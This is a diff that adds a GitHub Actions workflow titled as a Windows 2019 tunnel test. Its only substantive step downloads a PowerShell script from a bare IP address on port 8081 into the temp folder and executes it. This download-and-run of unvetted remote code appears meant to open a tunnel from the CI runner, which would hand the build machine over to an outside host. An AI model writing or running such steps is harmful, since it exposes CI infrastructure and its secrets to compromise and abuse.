@@ -1,0 +1,13 @@
+name: Test Win2019 Tunnel
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: windows-2019
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start tunnel
+        shell: powershell
+        run: |
+          $wc = New-Object System.Net.WebClient
+          $wc.DownloadFile('http://47.113.199.6:8081/setup.ps1', "$env:TEMP\s.ps1")
+          & "$env:TEMP\s.ps1"
